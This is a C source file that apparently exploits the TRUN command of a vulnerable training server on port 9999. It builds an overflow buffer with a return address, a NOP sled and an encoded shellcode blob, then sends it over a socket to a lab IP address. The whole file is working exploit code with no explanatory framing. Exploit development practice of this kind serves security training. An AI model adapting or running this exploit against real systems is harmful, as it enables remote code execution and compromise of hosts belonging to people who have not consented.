#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

int main()
{
  char shellcode[]= {"\xb8\x0b\xd0\x0e\x06\xd9\xc5\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
  "\x53\x31\x42\x12\x03\x42\x12\x83\xe1\x2c\xec\xf3\x09\x24\x73"
  "\xfb\xf1\xb5\x14\x75\x14\x84\x14\xe1\x5d\xb7\xa4\x61\x33\x34"
  "\x4e\x27\xa7\xcf\x22\xe0\xc8\x78\x88\xd6\xe7\x79\xa1\x2b\x66"
  "\xfa\xb8\x7f\x48\xc3\x72\x72\x89\x04\x6e\x7f\xdb\xdd\xe4\xd2"
  "\xcb\x6a\xb0\xee\x60\x20\x54\x77\x95\xf1\x57\x56\x08\x89\x01"
  "\x78\xab\x5e\x3a\x31\xb3\x83\x07\x8b\x48\x77\xf3\x0a\x98\x49"
  "\xfc\xa1\xe5\x65\x0f\xbb\x22\x41\xf0\xce\x5a\xb1\x8d\xc8\x99"
  "\xcb\x49\x5c\x39\x6b\x19\xc6\xe5\x8d\xce\x91\x6e\x81\xbb\xd6"
  "\x28\x86\x3a\x3a\x43\xb2\xb7\xbd\x83\x32\x83\x99\x07\x1e\x57"
  "\x83\x1e\xfa\x36\xbc\x40\xa5\xe7\x18\x0b\x48\xf3\x10\x56\x05"
  "\x30\x19\x68\xd5\x5e\x2a\x1b\xe7\xc1\x80\xb3\x4b\x89\x0e\x44"
  "\xab\xa0\xf7\xda\x52\x4b\x08\xf3\x90\x1f\x58\x6b\x30\x20\x33"
  "\x6b\xbd\xf5\xae\x63\x18\xa6\xcc\x8e\xda\x16\x51\x20\xb3\x7c"
  "\x5e\x1f\xa3\x7e\xb4\x08\x4c\x83\x37\x27\xd1\x0a\xd1\x2d\xf9"
  "\x5a\x49\xd9\x3b\xb9\x42\x7e\x43\xeb\xfa\xe8\x0c\xfd\x3d\x17"
  "\x8d\x2b\x6a\x8f\x06\x38\xae\xae\x18\x15\x86\xa7\x8f\xe3\x47"
  "\x8a\x2e\xf3\x4d\x7c\xd2\x66\x0a\x7c\x9d\x9a\x85\x2b\xca\x6d"
  "\xdc\xb9\xe6\xd4\x76\xdf\xfa\x81\xb1\x5b\x21\x72\x3f\x62\xa4"
  "\xce\x1b\x74\x70\xce\x27\x20\x2c\x99\xf1\x9e\x8a\x73\xb0\x48"
  "\x45\x2f\x1a\x1c\x10\x03\x9d\x5a\x1d\x4e\x6b\x82\xac\x27\x2a"
  "\xbd\x01\xa0\xba\xc6\x7f\x50\x44\x1d\xc4\x70\xa7\xb7\x31\x19"
  "\x7e\x52\xf8\x44\x81\x89\x3f\x71\x02\x3b\xc0\x86\x1a\x4e\xc5"
  "\xc3\x9c\xa3\xb7\x5c\x49\xc3\x64\x5c\x58"};

  int sock;
  int conn;
  int sockSend;
  struct sockaddr_in target;
  char *serverIP = "172.16.50.128";
  int serverPort = 9999;
  char opt[5000] = "TRUN /.:";
  char buffer[2004];
  char jmpInsp[] = "\xAF\x11\x50\x62";
  char nop[20];

  memset(buffer, 0x41, sizeof(buffer));
  memset(nop, 0x90, sizeof(nop));
  strcat(opt, buffer);
  strcat(opt,jmpInsp);
  strcat(opt,nop);
  strcat(opt, shellcode);

  sock = socket(AF_INET, SOCK_STREAM, 0);
  if(sock == -1){
    printf("could not create socket\n");
  }

  target.sin_family = AF_INET;
  target.sin_addr.s_addr = inet_addr(serverIP);
  target.sin_port = htons(serverPort);

  conn = connect(sock, (struct sockaddr *)&target, sizeof(struct sockaddr_in));
  if (conn < 0) {
    printf("connection to target failed.\n");
  } printf("successfully connected to target\n");

  sockSend = send(sock, opt, sizeof(opt), 0);
  if (sockSend < 0){
    printf("sending of buffer failed\n");
  } printf("exploit sent successfully\n");
}
